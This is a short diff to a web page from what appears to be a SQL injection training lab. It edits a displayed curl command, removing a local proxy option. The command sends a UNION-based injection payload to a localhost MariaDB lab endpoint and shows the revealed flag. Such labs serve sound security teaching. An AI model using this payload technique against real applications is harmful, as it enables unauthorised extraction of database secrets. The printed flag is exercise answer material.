@@ -98,7 +98,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab4" \<br> --data-urlencode "name=XYZNOTEXIST' UNION SELECT id, 'SECRET=' || secret_value, NULL FROM oracle_secrets -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab4" \<br> --data-urlencode "name=XYZNOTEXIST' UNION SELECT id, 'SECRET=' || secret_value, NULL FROM oracle_secrets -- -"<br><br>
         <span class="prompt">Result: </span>1 | <strong>SECRET=FLAG{ma_0r4cl3_m0d3_plsql}</strong>
     </div>
 </div>
